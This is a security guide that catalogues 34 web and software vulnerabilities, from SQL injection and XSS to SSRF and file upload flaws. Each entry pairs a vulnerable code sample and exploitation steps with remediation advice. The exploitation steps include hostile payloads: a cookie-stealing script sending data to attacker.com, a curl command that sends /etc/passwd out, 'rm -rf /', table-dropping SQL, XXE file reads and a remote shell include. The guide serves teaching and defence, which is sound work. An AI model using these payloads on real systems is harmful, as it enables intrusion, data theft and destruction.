# Comprehensive Security Vulnerabilities Guide

## Table of Contents

### Authentication & Session Management (7 vulnerabilities)
- #1 SQL Injection
- #2 Weak Passwords
- #3 Plaintext Password Storage
- #4 Predictable Session Tokens
- #22 Missing Function Access Control
- #24 Authentication Bypass
- #28 Broken API Authentication

### Authorization & Access Control (4 vulnerabilities)
- #5 Privilege Escalation
- #8 IDOR (Insecure Direct Object Reference)
- #9 Missing Access Control
- #10 Information Disclosure

### Injection Vulnerabilities (7 vulnerabilities)
- #16 Stored XSS
- #17 DOM-based XSS
- #18 CRLF Injection
- #19 Reflected XSS
- #23 Command Injection
- #30 XXE Injection
- #31 Mass Assignment

### File & Path Vulnerabilities (5 vulnerabilities)
- #25 Directory Traversal
- #26 Local File Inclusion (LFI)
- #27 Remote File Inclusion (RFI)
- #32 Unrestricted File Upload
- #33 Path Traversal in Upload

### Business Logic & Data (6 vulnerabilities)
- #11 CSRF (Cross-Site Request Forgery)
- #12 Buffer Overflow
- #13 Integer Overflow
- #14 SSRF (Server-Side Request Forgery)
- #15 HTTP Parameter Pollution
- #29 Excessive Data Exposure

### Security Misconfigurations (5 vulnerabilities)
- #6 Insufficient Password Policy
- #7 No Email Verification
- #20 Open Redirect
- #21 HTTP Response Splitting
- #34 Arbitrary File Execution

---

## Authentication & Session Management Vulnerabilities

### #1 SQL Injection

**Description:**
SQL Injection occurs when an attacker can insert malicious SQL code into application queries, allowing unauthorized access to database contents, modification of data, or execution of administrative operations.

**Types:**
- **In-band SQLi:** Results are directly visible in the application response
  - Error-based: Uses database error messages to extract information
  - Union-based: Uses UNION SQL operator to combine results
- **Inferential (Blind) SQLi:** No direct data transfer, attacker reconstructs database structure
  - Boolean-based: Sends queries that return different results based on TRUE/FALSE
  - Time-based: Uses database commands to delay response
- **Out-of-band SQLi:** Uses different channels (DNS, HTTP requests) to retrieve data

**Example Scenario:**
A login form that constructs SQL queries like:
```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

**How to Exploit:**
1. Input: `admin' OR '1'='1` as username
2. Resulting query: `SELECT * FROM users WHERE username='admin' OR '1'='1' AND password=''`
3. The condition `'1'='1'` is always true, bypassing authentication
4. Advanced: `admin'; DROP TABLE users; --` to delete tables

**Remediation:**
- Use parameterized queries/prepared statements
- Implement input validation and sanitization
- Use ORM frameworks that handle SQL safely
- Apply principle of least privilege to database accounts
- Use stored procedures
- Implement WAF (Web Application Firewall)

---

### #2 Weak Passwords

**Description:**
Weak passwords are easily guessable or crackable passwords that don't meet security standards, making accounts vulnerable to brute force and dictionary attacks.

**Types:**
- Dictionary words (e.g., "password", "admin")
- Common patterns (e.g., "123456", "qwerty")
- Personal information (names, birthdays)
- Short passwords (less than 8 characters)
- Single character type (only lowercase, only numbers)

**Example Scenario:**
A user registration system that accepts passwords like "pass123" or "admin" without enforcing complexity requirements.

**How to Exploit:**
1. Use password cracking tools (Hydra, John the Ripper, Hashcat)
2. Perform dictionary attacks with common password lists
3. Try default credentials (admin/admin, root/root)
4. Use credential stuffing from leaked databases
5. Brute force short passwords

**Remediation:**
- Enforce minimum password length (12+ characters)
- Require complexity (uppercase, lowercase, numbers, special characters)
- Implement password strength meters
- Check against common password lists
- Use multi-factor authentication (MFA)
- Implement account lockout after failed attempts
- Educate users on password best practices

---

### #3 Plaintext Password Storage

**Description:**
Storing passwords in plaintext or using weak/reversible encryption makes all user accounts vulnerable if the database is compromised.

**Types:**
- Plaintext storage in database
- Reversible encryption (Base64, simple XOR)
- Weak hashing (MD5, SHA1 without salt)
- Inadequate hashing (no salt, weak algorithms)

**Example Scenario:**
Database table storing passwords:
```sql
| username | password    |
|----------|-------------|
| admin    | Admin123!   |
| user1    | mypassword  |
```

**How to Exploit:**
1. Gain database access through SQL injection or backup files
2. Read passwords directly from database
3. Use credentials to access user accounts
4. Perform credential stuffing on other services
5. If encrypted weakly, decrypt using known methods

**Remediation:**
- Use strong hashing algorithms (bcrypt, Argon2, PBKDF2)
- Implement unique salts for each password
- Use sufficient work factor/iterations
- Never store plaintext passwords
- Implement pepper (application-level secret)
- Regular security audits of password storage
- Force password reset if breach detected

---

### #4 Predictable Session Tokens

**Description:**
Session tokens that follow predictable patterns or use weak randomness can be guessed or calculated by attackers, allowing session hijacking.

**Types:**
- Sequential tokens (session1, session2, session3)
- Timestamp-based tokens
- Weak random number generation
- Short token length
- Tokens based on user information

**Example Scenario:**
Session tokens generated as: `user_id + timestamp` = `12345_1638360000`

**How to Exploit:**
1. Capture your own session token
2. Analyze pattern or algorithm
3. Generate valid tokens for other users
4. Use predicted tokens to hijack sessions
5. Automate token generation and testing

**Remediation:**
- Use cryptographically secure random number generators
- Generate tokens with sufficient entropy (128+ bits)
- Implement token expiration
- Regenerate tokens after authentication
- Use secure session management frameworks
- Implement token binding to user attributes
- Monitor for suspicious session activity

---

### #22 Missing Function Access Control

**Description:**
Functions or API endpoints that don't verify user permissions before execution, allowing unauthorized users to perform privileged operations.

**Types:**
- Unprotected admin functions
- Missing role checks
- Client-side only access control
- Inconsistent authorization checks

**Example Scenario:**
Admin function accessible without proper checks:
```python
@app.route('/admin/delete_user/<user_id>')
def delete_user(user_id):
    # No authorization check
    db.delete_user(user_id)
```

**How to Exploit:**
1. Discover admin/privileged endpoints through enumeration
2. Access functions directly without proper authentication
3. Call API endpoints with regular user credentials
4. Manipulate client-side restrictions
5. Use tools like Burp Suite to test authorization

**Remediation:**
- Implement authorization checks on all functions
- Use role-based access control (RBAC)
- Verify permissions server-side
- Apply principle of least privilege
- Use middleware/decorators for consistent checks
- Implement proper API gateway security
- Regular security testing and code reviews

---

### #24 Authentication Bypass

**Description:**
Vulnerabilities that allow attackers to circumvent authentication mechanisms and gain unauthorized access without valid credentials.

**Types:**
- Logic flaws in authentication code
- SQL injection in login forms
- Cookie manipulation
- Session fixation
- Authentication token manipulation
- Default credentials
- Broken authentication workflows

**Example Scenario:**
Flawed authentication logic:
```python
if username == "admin":
    if password == admin_password:
        login_success = True
else:
    login_success = True  # Logic error
```

**How to Exploit:**
1. Test for SQL injection in login forms
2. Manipulate authentication cookies
3. Exploit logic flaws in multi-step authentication
4. Use default or hardcoded credentials
5. Bypass client-side validation
6. Exploit password reset mechanisms
7. Session fixation attacks

**Remediation:**
- Implement secure authentication frameworks
- Use multi-factor authentication
- Proper input validation and sanitization
- Secure session management
- Remove default credentials
- Implement rate limiting
- Regular security code reviews
- Use security testing tools

---

### #28 Broken API Authentication

**Description:**
APIs that lack proper authentication mechanisms or implement them incorrectly, allowing unauthorized access to API endpoints and data.

**Types:**
- Missing authentication headers
- Weak API key implementation
- Exposed API keys in client code
- No token expiration
- Insecure token storage
- Missing rate limiting

**Example Scenario:**
API endpoint without authentication:
```python
@app.route('/api/users')
def get_all_users():
    # No authentication check
    return jsonify(User.query.all())
```

**How to Exploit:**
1. Access API endpoints without credentials
2. Extract API keys from client-side code
3. Reuse stolen or leaked API keys
4. Brute force weak API keys
5. Use expired tokens that aren't validated
6. Enumerate API endpoints without authentication

**Remediation:**
- Implement OAuth 2.0 or JWT authentication
- Use API gateways with authentication
- Rotate API keys regularly
- Implement token expiration and refresh
- Never expose keys in client code
- Use HTTPS for all API communications
- Implement rate limiting and throttling
- Monitor API usage for anomalies

---

## Authorization & Access Control Vulnerabilities

### #5 Privilege Escalation

**Description:**
Attackers gain higher-level permissions than intended, allowing them to perform administrative actions or access restricted resources.

**Types:**
- Vertical privilege escalation (user to admin)
- Horizontal privilege escalation (user to another user)
- Parameter manipulation
- Role manipulation
- Exploiting missing authorization checks

**Example Scenario:**
User role stored in client-side cookie:
```
Cookie: role=user
```
Attacker changes to: `role=admin`

**How to Exploit:**
1. Modify user role parameters in requests
2. Manipulate cookies or session data
3. Access admin URLs directly
4. Exploit missing server-side validation
5. Use parameter tampering tools
6. Exploit race conditions in role assignment

**Remediation:**
- Store roles server-side only
- Implement proper authorization checks
- Use role-based access control (RBAC)
- Validate permissions on every request
- Implement principle of least privilege
- Regular security audits
- Use secure session management

---

### #8 IDOR (Insecure Direct Object Reference)

**Description:**
Application exposes references to internal objects (files, database records) without proper authorization, allowing attackers to access other users' data.

**Types:**
- Sequential ID manipulation
- GUID/UUID exposure
- File path manipulation
- Database key exposure

**Example Scenario:**
URL to view user profile:
```
https://example.com/profile?user_id=123
```
Attacker changes to `user_id=124` to view another user's profile.

**How to Exploit:**
1. Identify object references in URLs or parameters
2. Modify IDs to access other objects
3. Enumerate sequential IDs
4. Use automated tools to test multiple IDs
5. Access files by manipulating file paths
6. Exploit predictable object references

**Remediation:**
- Implement proper authorization checks
- Use indirect references (mapping tables)
- Validate user ownership of objects
- Use UUIDs instead of sequential IDs
- Implement access control lists (ACLs)
- Never expose internal object references
- Log and monitor access attempts

---

### #9 Missing Access Control

**Description:**
Resources or functions lack proper access control checks, allowing any authenticated (or unauthenticated) user to access them.

**Types:**
- Missing authentication checks
- Missing authorization checks
- Unprotected API endpoints
- Exposed admin interfaces
- Client-side only restrictions

**Example Scenario:**
Admin page accessible without checks:
```html
<!-- admin.html accessible to anyone -->
<a href="/admin.html">Admin Panel</a>
```

**How to Exploit:**
1. Directly access restricted URLs
2. Enumerate hidden endpoints
3. Bypass client-side restrictions
4. Access API endpoints without credentials
5. Use directory brute forcing tools
6. Manipulate requests to access restricted resources

**Remediation:**
- Implement authentication and authorization on all resources
- Use middleware for consistent access control
- Server-side validation for all requests
- Implement default-deny access control
- Regular security testing
- Use security frameworks with built-in access control
- Proper error handling (don't reveal existence of resources)

---

### #10 Information Disclosure

**Description:**
Application reveals sensitive information that should be kept confidential, such as system details, user data, or internal application structure.

**Types:**
- Verbose error messages
- Directory listings
- Source code exposure
- Configuration file exposure
- Debug information in production
- Sensitive data in responses
- Comments in HTML/JavaScript

**Example Scenario:**
Error message revealing database structure:
```
Error: Column 'credit_card_number' not found in table 'users'
Database: MySQL 5.7.32 on server db.internal.company.com
```

**How to Exploit:**
1. Trigger error messages to gather information
2. Access exposed configuration files
3. View directory listings
4. Read comments in source code
5. Analyze verbose responses
6. Use search engines to find exposed files
7. Exploit debug modes left enabled

**Remediation:**
- Implement generic error messages
- Disable directory listings
- Remove debug information in production
- Secure configuration files
- Remove comments from production code
- Implement proper error handling
- Use security headers
- Regular security scans
- Minimize data in API responses

---

## Injection Vulnerabilities

### #16 Stored XSS (Cross-Site Scripting)

**Description:**
Malicious scripts are permanently stored on the target server (database, file system) and executed when other users view the infected page.

**Types:**
- Database-stored XSS
- File-based XSS
- Comment/forum XSS
- Profile field XSS

**Example Scenario:**
Comment system that stores and displays user input without sanitization:
```html
<div class="comment">
    <!-- User input stored: <script>alert('XSS')</script> -->
    <script>alert('XSS')</script>
</div>
```

**How to Exploit:**
1. Submit malicious script in input fields
2. Script gets stored in database
3. When other users view the page, script executes
4. Steal cookies: `<script>document.location='http://attacker.com/?c='+document.cookie</script>`
5. Keylogging, session hijacking, defacement
6. Redirect users to phishing sites

**Remediation:**
- Input validation and sanitization
- Output encoding (HTML entity encoding)
- Use Content Security Policy (CSP)
- Implement HTTPOnly cookies
- Use security libraries for XSS prevention
- Regular security testing
- Validate data types and formats
- Use templating engines with auto-escaping

---

### #17 DOM-based XSS

**Description:**
Vulnerability exists in client-side JavaScript code that processes user input and updates the DOM without proper sanitization.

**Types:**
- URL fragment manipulation
- JavaScript execution via DOM manipulation
- Client-side template injection
- Unsafe JavaScript functions (eval, innerHTML)

**Example Scenario:**
JavaScript code that uses URL parameters unsafely:
```javascript
// Vulnerable code
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + name;
```
URL: `http://example.com/#<img src=x onerror=alert('XSS')>`

**How to Exploit:**
1. Craft malicious URL with JavaScript payload
2. Trick users into clicking the link
3. Payload executes in victim's browser
4. Steal sensitive data or perform actions
5. Use DOM manipulation to inject scripts
6. Exploit unsafe JavaScript functions

**Remediation:**
- Use safe DOM manipulation methods (textContent instead of innerHTML)
- Validate and sanitize all user inputs
- Avoid using eval() and similar functions
- Implement Content Security Policy
- Use security-focused JavaScript frameworks
- Regular code reviews
- Use DOM sanitization libraries
- Encode output properly

---

### #18 CRLF Injection

**Description:**
Attacker injects Carriage Return (CR) and Line Feed (LF) characters into application input, allowing manipulation of HTTP headers or log files.

**Types:**
- HTTP Response Splitting
- Log injection
- Header injection
- Email header injection

**Example Scenario:**
Application sets cookie based on user input:
```python
response.headers['Set-Cookie'] = 'user=' + user_input
```
Attacker input: `admin%0d%0aSet-Cookie: admin=true`

**How to Exploit:**
1. Inject CRLF characters (%0d%0a or \r\n)
2. Add malicious headers
3. Perform XSS via header injection
4. Cache poisoning
5. Session fixation
6. Log file manipulation to hide tracks

**Remediation:**
- Validate and sanitize all user inputs
- Remove or encode CRLF characters
- Use framework functions for header setting
- Implement input validation
- Use security libraries
- Regular security testing
- Proper logging mechanisms

---

### #19 Reflected XSS

**Description:**
Malicious script is reflected off a web server in the response, typically via URL parameters or form inputs, and executed immediately in the victim's browser.

**Types:**
- URL parameter XSS
- Form input XSS
- Search field XSS
- Error message XSS

**Example Scenario:**
Search functionality that reflects user input:
```php
<?php
echo "You searched for: " . $_GET['query'];
?>
```
URL: `http://example.com/search?query=<script>alert('XSS')</script>`

**How to Exploit:**
1. Craft malicious URL with JavaScript payload
2. Send link to victim (phishing, social engineering)
3. Victim clicks link
4. Script executes in victim's browser context
5. Steal cookies, session tokens
6. Perform actions on behalf of user
7. Redirect to phishing sites

**Remediation:**
- Input validation and sanitization
- Output encoding (HTML entity encoding)
- Content Security Policy (CSP)
- HTTPOnly and Secure cookie flags
- Use security frameworks
- Validate data types
- Implement WAF
- User education about suspicious links

---

### #23 Command Injection

**Description:**
Attacker executes arbitrary system commands on the server by injecting malicious input into application functions that execute shell commands.

**Types:**
- OS command injection
- Shell injection
- Blind command injection
- Time-based command injection

**Example Scenario:**
Application executes system commands with user input:
```python
import os
filename = request.form['filename']
os.system('cat ' + filename)
```
Attacker input: `file.txt; rm -rf /`

**How to Exploit:**
1. Identify input fields that execute commands
2. Inject command separators (; | & && ||)
3. Execute arbitrary commands
4. Chain multiple commands
5. Exfiltrate data: `; curl attacker.com?data=$(cat /etc/passwd)`
6. Establish reverse shell
7. Modify or delete files

**Remediation:**
- Avoid executing system commands with user input
- Use language-specific APIs instead of shell commands
- Input validation with whitelist approach
- Escape special characters
- Use parameterized commands
- Implement principle of least privilege
- Run applications with minimal permissions
- Use sandboxing and containerization

---

### #30 XXE (XML External Entity) Injection

**Description:**
Attacker exploits vulnerable XML parsers to access local files, perform SSRF attacks, or cause denial of service by injecting malicious XML external entities.

**Types:**
- File disclosure XXE
- SSRF via XXE
- Denial of Service XXE
- Blind XXE (out-of-band)

**Example Scenario:**
Application parses XML without disabling external entities:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**How to Exploit:**
1. Submit XML with malicious external entity
2. Read local files: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
3. Perform SSRF: `<!ENTITY xxe SYSTEM "http://internal-server/">`
4. Denial of Service: Billion laughs attack
5. Out-of-band data exfiltration
6. Port scanning internal network

**Remediation:**
- Disable external entity processing in XML parsers
- Use less complex data formats (JSON)
- Input validation
- Update XML libraries
- Implement whitelist for XML schemas
- Use secure XML parser configurations
- Patch and update dependencies
- Network segmentation

---

### #31 Mass Assignment

**Description:**
Application automatically binds user input to internal objects without filtering, allowing attackers to modify object properties they shouldn't have access to.

**Types:**
- Parameter binding vulnerabilities
- Object property injection
- Privilege escalation via mass assignment
- Data manipulation

**Example Scenario:**
User registration that binds all parameters:
```python
user = User(**request.form)  # Binds all form data
user.save()
```
Attacker adds: `is_admin=true` to the form data

**How to Exploit:**
1. Identify object properties through error messages or documentation
2. Add additional parameters to requests
3. Modify sensitive fields (role, permissions, prices)
4. Escalate privileges by setting admin flags
5. Bypass payment by modifying price fields
6. Manipulate account balances

**Remediation:**
- Use whitelist approach for allowed parameters
- Explicitly define bindable attributes
- Implement proper authorization checks
- Use DTOs (Data Transfer Objects)
- Validate all input parameters
- Separate internal and external models
- Regular code reviews
- Use framework security features

---

## File & Path Vulnerabilities

### #25 Directory Traversal

**Description:**
Attacker manipulates file path parameters to access files and directories outside the intended directory, potentially accessing sensitive system files.

**Types:**
- Path traversal using ../
- Absolute path manipulation
- URL encoding bypass
- Double encoding bypass

**Example Scenario:**
Application serves files based on user input:
```python
filename = request.args.get('file')
with open('/var/www/files/' + filename) as f:
    return f.read()
```
Attacker input: `../../../../etc/passwd`

**How to Exploit:**
1. Use ../ sequences to traverse directories
2. Access sensitive files: `../../../../etc/passwd`
3. Try different encoding: `..%2F..%2F..%2Fetc%2Fpasswd`
4. Double encoding: `..%252F..%252F`
5. Null byte injection: `../../../../etc/passwd%00.jpg`
6. Access configuration files, source code, credentials

**Remediation:**
- Validate and sanitize file paths
- Use whitelist of allowed files
- Implement proper access controls
- Use absolute paths and validate against base directory
- Avoid user input in file operations
- Use chroot jails or sandboxing
- Remove ../ sequences
- Implement proper error handling

---

### #26 Local File Inclusion (LFI)

**Description:**
Attacker includes local files from the server through vulnerable include/require functions, potentially executing code or accessing sensitive information.

**Types:**
- Basic LFI
- LFI with code execution
- LFI via log poisoning
- LFI with null byte injection

**Example Scenario:**
PHP application with dynamic includes:
```php
<?php
$page = $_GET['page'];
include($page . '.php');
?>
```
Attacker input: `../../../../etc/passwd%00`

**How to Exploit:**
1. Manipulate file inclusion parameters
2. Include sensitive files: `/etc/passwd`, configuration files
3. Log poisoning: inject PHP code into logs, then include log file
4. Include uploaded files with malicious code
5. Use null byte to bypass extensions
6. Chain with other vulnerabilities for code execution
7. Access source code and credentials

**Remediation:**
- Avoid dynamic file inclusion based on user input
- Use whitelist of allowed files
- Implement proper input validation
- Use mapping/routing instead of direct inclusion
- Disable dangerous PHP functions
- Proper file permissions
- Regular security audits
- Use framework routing mechanisms

---

### #27 Remote File Inclusion (RFI)

**Description:**
Attacker includes remote files from external servers, typically leading to remote code execution by including malicious scripts.

**Types:**
- Direct RFI
- RFI with code execution
- RFI via URL wrappers
- Data URI RFI

**Example Scenario:**
PHP application allowing remote includes:
```php
<?php
$module = $_GET['module'];
include($module);
?>
```
Attacker input: `http://attacker.com/shell.php`

**How to Exploit:**
1. Host malicious file on attacker-controlled server
2. Include remote file via vulnerable parameter
3. Execute arbitrary code on target server
4. Establish backdoor or web shell
5. Use data:// or php:// wrappers
6. Bypass filters with encoding
7. Complete server compromise

**Remediation:**
- Disable allow_url_include in PHP
- Disable allow_url_fopen if not needed
- Never use user input in include/require
- Implement strict input validation
- Use whitelist approach
- Disable dangerous PHP wrappers
- Regular security updates
- Network-level filtering

---

### #32 Unrestricted File Upload

**Description:**
Application allows users to upload files without proper validation, enabling attackers to upload malicious files that can be executed on the server.

**Types:**
- Executable file upload (PHP, JSP, ASP)
- Malicious file content
- File type bypass
- Double extension bypass
- MIME type manipulation

**Example Scenario:**
Upload function without validation:
```python
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    file.save('/uploads/' + file.filename)
```
Attacker uploads: `shell.php`

**How to Exploit:**
1. Upload web shell (PHP, ASP, JSP)
2. Access uploaded file to execute code
3. Bypass filters: `shell.php.jpg`, `shell.php%00.jpg`
4. Manipulate MIME types
5. Upload malware or viruses
6. Overwrite critical files
7. DoS via large files
8. XSS via SVG or HTML uploads

**Remediation:**
- Validate file types (whitelist approach)
- Check file content, not just extension
- Rename uploaded files
- Store uploads outside web root
- Implement file size limits
- Scan files for malware
- Use separate domain for user content
- Disable script execution in upload directories
- Implement proper access controls

---

### #33 Path Traversal in Upload

**Description:**
Attacker manipulates file upload paths to write files to arbitrary locations on the server, potentially overwriting critical files or placing malicious files in executable directories.

**Types:**
- Directory traversal in filename
- Absolute path manipulation
- Symbolic link attacks
- Zip slip vulnerability

**Example Scenario:**
Upload function using user-provided filename:
```python
filename = request.files['file'].filename
file.save('/uploads/' + filename)
```
Attacker filename: `../../../../var/www/html/shell.php`

**How to Exploit:**
1. Use ../ in filename to traverse directories
2. Upload to web-accessible directories
3. Overwrite configuration files
4. Place web shells in executable locations
5. Zip slip: malicious archive with traversal paths
6. Overwrite .htaccess or web.config
7. Replace legitimate application files

**Remediation:**
- Sanitize and validate filenames
- Remove path traversal sequences
- Generate random filenames
- Use basename() to extract filename only
- Validate against whitelist of characters
- Store files outside web root
- Implement proper access controls
- Use secure file handling libraries
- Validate archive contents before extraction

---

## Business Logic & Data Vulnerabilities

### #11 CSRF (Cross-Site Request Forgery)

**Description:**
Attacker tricks authenticated users into executing unwanted actions on a web application where they're authenticated, exploiting the trust the application has in the user's browser.

**Types:**
- GET-based CSRF
- POST-based CSRF
- JSON CSRF
- Login CSRF

**Example Scenario:**
Money transfer without CSRF protection:
```html
<form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
</form>
```
Attacker hosts this on malicious site, victim visits while logged into bank.

**How to Exploit:**
1. Create malicious page with forged request
2. Trick authenticated user to visit page
3. Browser automatically sends cookies
4. Action executes with user's privileges
5. Change email, password, transfer money
6. Use hidden iframes or auto-submitting forms
7. Exploit via image tags for GET requests

**Remediation:**
- Implement CSRF tokens (synchronizer token pattern)
- Use SameSite cookie attribute
- Verify Origin and Referer headers
- Require re-authentication for sensitive actions
- Use custom headers for AJAX requests
- Implement double-submit cookie pattern
- User interaction for critical operations
- Short session timeouts

---

### #12 Buffer Overflow

**Description:**
Program writes more data to a buffer than it can hold, potentially overwriting adjacent memory and allowing code execution or crashes.

**Types:**
- Stack-based buffer overflow
- Heap-based buffer overflow
- Integer overflow leading to buffer overflow
- Format string vulnerabilities

**Example Scenario:**
C code without bounds checking:
```c
char buffer[10];
strcpy(buffer, user_input);  // No length check
```
Input longer than 10 bytes overwrites adjacent memory.

**How to Exploit:**
1. Identify vulnerable input fields
2. Send input larger than buffer size
3. Overwrite return addresses
4. Inject shellcode
5. Redirect execution flow
6. Gain code execution
7. Escalate privileges

**Remediation:**
- Use safe functions (strncpy, snprintf)
- Implement bounds checking
- Use memory-safe languages
- Enable compiler protections (ASLR, DEP, stack canaries)
- Input validation and length checks
- Use modern development frameworks
- Regular security testing
- Code reviews and static analysis

---

### #13 Integer Overflow

**Description:**
Arithmetic operation results in a value too large for the integer type, wrapping around to a small or negative value, potentially causing security issues.

**Types:**
- Signed integer overflow
- Unsigned integer overflow
- Integer underflow
- Width overflow

**Example Scenario:**
Price calculation with integer overflow:
```c
unsigned int price = 100;
unsigned int quantity = user_input;  // 4294967295
unsigned int total = price * quantity;  // Overflows to small value
```

**How to Exploit:**
1. Identify arithmetic operations on user input
2. Provide values that cause overflow
3. Bypass payment systems (overflow to $0)
4. Cause buffer overflows via size calculations
5. Bypass authentication checks
6. Manipulate resource allocations
7. Cause denial of service

**Remediation:**
- Use safe arithmetic libraries
- Validate input ranges
- Check for overflow before operations
- Use larger integer types
- Implement proper error handling
- Use languages with overflow protection
- Static code analysis
- Thorough testing with boundary values

---

### #14 SSRF (Server-Side Request Forgery)

**Description:**
Attacker tricks the server into making HTTP requests to arbitrary destinations, potentially accessing internal resources or performing actions on behalf of the server.

**Types:**
- Basic SSRF
- Blind SSRF
- SSRF via URL parameters
- SSRF via file upload (XXE, SVG)
- DNS rebinding SSRF

**Example Scenario:**
Application fetches URLs provided by users:
```python
url = request.args.get('url')
response = requests.get(url)
return response.content
```
Attacker input: `http://localhost/admin` or `http://169.254.169.254/latest/meta-data/`

**How to Exploit:**
1. Access internal services: `http://localhost:8080/admin`
2. Read cloud metadata: `http://169.254.169.254/`
3. Port scanning internal network
4. Access internal APIs and databases
5. Read local files: `file:///etc/passwd`
6. Bypass firewall restrictions
7. Perform actions on internal systems

**Remediation:**
- Validate and sanitize URLs
- Use whitelist of allowed domains/IPs
- Block access to private IP ranges
- Disable unnecessary URL schemes (file://, gopher://)
- Implement network segmentation
- Use separate network for external requests
- Monitor outbound traffic
- Implement timeout and size limits

---

### #15 HTTP Parameter Pollution

**Description:**
Attacker sends multiple HTTP parameters with the same name, exploiting inconsistent parameter parsing between different components to bypass security controls.

**Types:**
- Query string pollution
- POST parameter pollution
- Cookie pollution
- Header pollution

**Example Scenario:**
Application uses first parameter, WAF checks last:
```
URL: /transfer?amount=1&amount=10000
Application reads: amount=1 (passes WAF)
Backend processes: amount=10000 (actual transfer)
```

**How to Exploit:**
1. Send duplicate parameters
2. Bypass WAF and security filters
3. Exploit inconsistent parsing
4. Override security parameters
5. Manipulate application logic
6. Bypass authentication checks
7. Inject malicious values

**Remediation:**
- Consistent parameter parsing across all layers
- Reject requests with duplicate parameters
- Use strict parameter validation
- Implement proper input handling
- Security testing with duplicate parameters
- Use framework built-in protections
- Validate parameter count
- Proper WAF configuration

---

### #29 Excessive Data Exposure

**Description:**
Application returns more data than necessary in API responses, exposing sensitive information that users shouldn't have access to.

**Types:**
- Over-fetching in APIs
- Sensitive fields in responses
- Debug information exposure
- Internal IDs and references
- PII exposure

**Example Scenario:**
API returns full user object:
```json
{
  "id": 123,
  "username": "john",
  "email": "john@example.com",
  "password_hash": "$2b$10$...",
  "ssn": "123-45-6789",
  "credit_card": "4111111111111111",
  "is_admin": false,
  "internal_notes": "VIP customer"
}
```

**How to Exploit:**
1. Analyze API responses for sensitive data
2. Extract password hashes for cracking
3. Collect PII for identity theft
4. Discover internal system information
5. Map application structure
6. Find privilege escalation vectors
7. Aggregate data from multiple endpoints

**Remediation:**
- Implement field-level access control
- Use DTOs to control response structure
- Return only necessary data
- Implement data minimization principle
- Use GraphQL with proper resolvers
- Filter sensitive fields
- Regular API security audits
- Implement response schemas
- Use serialization controls

---

## Security Misconfigurations

### #6 Insufficient Password Policy

**Description:**
Weak or missing password requirements allow users to create easily compromised passwords, making accounts vulnerable to attacks.

**Types:**
- No minimum length requirement
- No complexity requirements
- No password history
- No expiration policy
- Allowing common passwords

**Example Scenario:**
Registration accepting any password:
```python
def register(username, password):
    # No validation
    user = User(username=username, password=hash(password))
    user.save()
```
Users can set passwords like "123", "password", "abc"

**How to Exploit:**
1. Create accounts with weak passwords
2. Brute force weak passwords
3. Use dictionary attacks
4. Credential stuffing with common passwords
5. Social engineering easier with simple passwords
6. Automated account takeover

**Remediation:**
- Enforce minimum length (12+ characters)
- Require complexity (mixed case, numbers, symbols)
- Check against common password lists
- Implement password strength meter
- Prevent password reuse
- Consider passphrase approach
- Implement MFA
- User education
- Regular password audits

---

### #7 No Email Verification

**Description:**
Application doesn't verify email addresses during registration, allowing fake accounts, spam, and potential security issues.

**Types:**
- No verification at all
- Optional verification
- Weak verification tokens
- No expiration on tokens

**Example Scenario:**
Registration without email verification:
```python
def register(email, password):
    user = User(email=email, password=hash(password))
    user.save()
    login(user)  # Immediate access
```

**How to Exploit:**
1. Create accounts with fake emails
2. Register with other users' emails
3. Spam and abuse
4. Account enumeration
5. Bypass rate limiting with multiple accounts
6. Impersonation attacks
7. Resource exhaustion

**Remediation:**
- Implement email verification
- Send verification link/code
- Use secure random tokens
- Set token expiration (24 hours)
- Limit account functionality until verified
- Implement rate limiting on registration
- CAPTCHA for registration
- Monitor for suspicious patterns
- Allow email change only with verification

---

### #20 Open Redirect

**Description:**
Application redirects users to URLs specified in unvalidated parameters, allowing attackers to redirect victims to malicious sites.

**Types:**
- URL parameter redirect
- Header-based redirect
- JavaScript redirect
- Meta refresh redirect

**Example Scenario:**
Login redirect without validation:
```python
@app.route('/login')
def login():
    # After successful login
    redirect_url = request.args.get('next')
    return redirect(redirect_url)
```
Attacker URL: `https://bank.com/login?next=https://evil.com/phishing`

**How to Exploit:**
1. Craft URL with malicious redirect parameter
2. Send to victims via phishing
3. Legitimate domain builds trust
4. Redirect to phishing site
5. Steal credentials or install malware
6. Use in OAuth attacks
7. Bypass URL filters

**Remediation:**
- Validate redirect URLs against whitelist
- Use relative paths only
- Implement redirect token system
- Warn users about external redirects
- Validate domain and protocol
- Use indirect references
- Avoid user-controlled redirects
- Implement proper URL parsing

---

### #21 HTTP Response Splitting

**Description:**
Attacker injects CRLF characters into HTTP headers, allowing them to inject additional headers or even entire HTTP responses.

**Types:**
- Header injection
- Response splitting
- Cache poisoning
- XSS via headers

**Example Scenario:**
Setting header with user input:
```python
name = request.args.get('name')
response.headers['X-User-Name'] = name
```
Attacker input: `John%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a...`

**How to Exploit:**
1. Inject CRLF characters (\r\n)
2. Add malicious headers
3. Split response into multiple responses
4. Perform XSS attacks
5. Cache poisoning
6. Session fixation
7. Bypass security controls

**Remediation:**
- Validate and sanitize all header values
- Remove CRLF characters
- Use framework functions for headers
- Implement input validation
- Use security libraries
- Update web servers and frameworks
- Implement proper encoding
- Regular security testing

---

### #34 Arbitrary File Execution

**Description:**
Application allows execution of arbitrary files uploaded or specified by users, leading to remote code execution and complete system compromise.

**Types:**
- Direct file execution
- Script execution via upload
- Dynamic code evaluation
- Template injection leading to execution

**Example Scenario:**
Application executes uploaded files:
```python
filename = request.files['script'].filename
request.files['script'].save(filename)
exec(open(filename).read())  # Executes uploaded code
```

**How to Exploit:**
1. Upload malicious executable file
2. Trigger execution through application
3. Execute arbitrary code on server
4. Establish backdoor or web shell
5. Access sensitive data
6. Pivot to other systems
7. Complete server compromise

**Remediation:**
- Never execute user-uploaded files
- Disable dangerous functions (eval, exec)
- Implement strict file type validation
- Store uploads outside executable directories
- Use sandboxing and containerization
- Implement proper access controls
- Code review and security testing
- Use security frameworks
- Principle of least privilege
- Regular security audits

---

## Summary and Best Practices

### General Security Principles

1. **Defense in Depth**: Implement multiple layers of security controls
2. **Principle of Least Privilege**: Grant minimum necessary permissions
